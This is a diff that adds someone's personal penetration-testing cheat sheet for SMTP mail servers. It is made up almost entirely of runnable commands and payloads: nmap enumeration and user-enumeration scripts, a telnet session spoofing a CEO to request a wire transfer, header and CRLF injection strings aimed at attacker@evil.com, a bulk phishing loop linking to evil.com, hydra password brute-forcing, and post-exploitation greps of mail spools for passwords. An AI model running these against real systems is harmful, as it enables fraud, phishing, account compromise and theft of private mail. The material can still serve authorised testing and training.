@@ -1,0 +1,145 @@
+﻿Notes
+https://hackviser.com/tactics/pentesting/services/smtp Default Ports: 25 (SMTP), 465 (SMTPS), 587 (Submission)nmap -sV -p 25,465,587 target.com
+
+Create mail server: https://github.com/mailhog/MailHog
+
+
+Enum
+# Enumerate supported SMTP commands
+nmap -p 25 --script smtp-commands target.com
+
+# Test for user enumeration via VRFY/EXPN
+nmap -p 25 --script smtp-enum-users target.com
+
+# Extract NTLM authentication details
+nmap -p 25 --script smtp-ntlm-info target.com
+
+# Run all SMTP-related scripts
+nmap -p 25,465,587 --script smtp-* target.com
+
+
+
+# Send test email
+swaks --to victim@target.com --from sender@attacker.com --server target.com
+
+# With authentication
+swaks --to victim@target.com --from user@target.com \
+  --auth-user user@target.com --auth-password password \
+  --server target.com
+
+# With attachment
+swaks --to victim@target.com --from sender@attacker.com \
+  --attach /path/to/file.pdf \
+  --server target.com
+
+
+
+
+
+
+
+
+Attack Vectors
+Open relay testing - Test SMTP servers for open relay vulnerabilities that allow unauthorized email forwarding:
+
+# Test 2: Using nmap
+nmap -p 25 --script smtp-open-relay target.com
+
+# Test 3: Using swaks
+swaks --to external@domain.com --from external@otherdomain.com --server target.com
+
+
+Email Spoofing - Send emails with spoofed sender addresses to bypass authentication and appear legitimate:
+
+# Spoof email from CEO
+telnet target.com 25
+EHLO attacker.com
+MAIL FROM:<ceo@target.com>
+RCPT TO:<employee@target.com>
+DATA
+From: CEO <ceo@target.com>
+To: employee@target.com
+Subject: Urgent: Wire Transfer
+
+Please transfer $50,000 to account XYZ immediately.
+.
+QUIT
+
+# Using sendemail
+sendemail -f ceo@target.com -t employee@target.com \
+  -u "Urgent: Wire Transfer" \
+  -m "Please transfer funds..." \
+  -s target.com:25
+
+SMTP Injection - Inject malicious content into SMTP communications to bypass security controls:
+
+# Inject additional headers
+# In forms that send email
+
+Email: victim@target.com%0ACc:attacker@evil.com
+Email: victim@target.com%0ABcc:attacker@evil.com
+Email: victim@target.com%0AFrom:admin@target.com
+
+# Inject mail body
+Message: Test%0A.%0AMAIL FROM:<attacker@evil.com>%0ARCPT TO:<victim2@target.com>%0ADATA%0APhishing email%0A.
+
+# CRLF injection
+Subject: Test%0D%0ACc:attacker@evil.com
+
+Phishing:
+# Create phishing email list
+cat > targets.txt <<EOF
+victim1@target.com
+victim2@target.com
+victim3@target.com
+EOF
+
+# Send phishing emails
+while read email; do
+  swaks --to $email \
+    --from support@target.com \
+    --server target.com \
+    --header "Subject: Password Reset Required" \
+    --body "Click here: http://evil.com/phishing"
+done < targets.txt
+
+Hydra:
+# Using hydra
+hydra -l user@target.com -P passwords.txt smtp://target.com:587
+
+# With username list
+hydra -L users.txt -P passwords.txt smtp://target.com:587
+
+Post Exploitation
+# If you have access to mail server
+
+# Read mail spool
+cat /var/mail/username
+cat /var/spool/mail/username
+
+# Maildir format
+ls -la /home/username/Maildir/cur/
+cat /home/username/Maildir/cur/*
+
+# Extract email addresses
+grep -Eiorh '\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b' /var/mail/*
+
+# Search for sensitive keywords
+grep -r -i "password\|secret\|confidential" /var/mail/
+
+# Extract attachments
+find /var/mail/ -name "*.pdf" -o -name "*.doc" -o -name "*.xls"
+
+
+
+
+
+
+
+Swaks
+Connect to email server:
+swaks –f user@domain –t user@domain –d email.eml -s 10.0.0.0:25  
+
+Send email with attachments
+
+swaks –ehlo user@domain –from name@domain –to user@domain –server smpt.server.local --h-From ‘”Name” <name@domain>’ --attach-type text/html --attach-body @Mail-template.html
